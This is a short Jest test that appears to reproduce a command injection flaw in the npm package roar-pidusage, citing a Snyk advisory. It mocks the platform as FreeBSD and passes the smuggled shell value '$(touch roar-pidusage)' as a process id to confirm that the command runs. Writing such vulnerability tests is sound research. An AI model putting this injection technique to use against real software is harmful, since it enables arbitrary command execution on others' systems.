//no error but no output seen
//https://snyk.io/vuln/npm:roar-pidusage
test("Command Injection in roar-pidusage", () => 
{
	const os = require('os');
	os.platform = () => { return "freebsd"; }; // emulate the vulnerable OS
	const roar_pidusage = require('roar-pidusage');
	const fs = require('fs')
	const path = './roar-pidusage'
	const sleep = require('sleep');	
	
    roar_pidusage.stat('$(touch roar-pidusage)', function(){});
	sleep.sleep(2);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);	
	fs.unlink(path, function(err) {}); // deleting the file after creation
});

